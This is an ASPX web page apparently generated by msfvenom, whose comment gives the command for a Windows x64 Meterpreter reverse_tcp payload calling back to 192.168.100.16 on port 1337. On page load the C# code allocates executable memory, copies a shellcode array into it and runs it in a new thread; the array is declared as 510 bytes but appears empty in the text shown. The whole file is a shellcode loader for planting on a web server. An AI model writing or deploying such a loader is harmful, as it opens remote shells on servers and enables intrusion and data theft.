<%-- msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.100.16 lport=1337 -f aspx -o mobius_device.aspx --%>
<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    protected void Page_Load(object sender, EventArgs e)
    {
        byte[] oahR = new byte[510] {
 };

        IntPtr yF4JxIzW = VirtualAlloc(IntPtr.Zero,(UIntPtr)oahR.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(oahR,0,yF4JxIzW,oahR.Length);
        IntPtr ue_Mtg2Zv = IntPtr.Zero;
        IntPtr vuUevQ = CreateThread(IntPtr.Zero,UIntPtr.Zero,yF4JxIzW,IntPtr.Zero,0,ref ue_Mtg2Zv);
    }
</script>
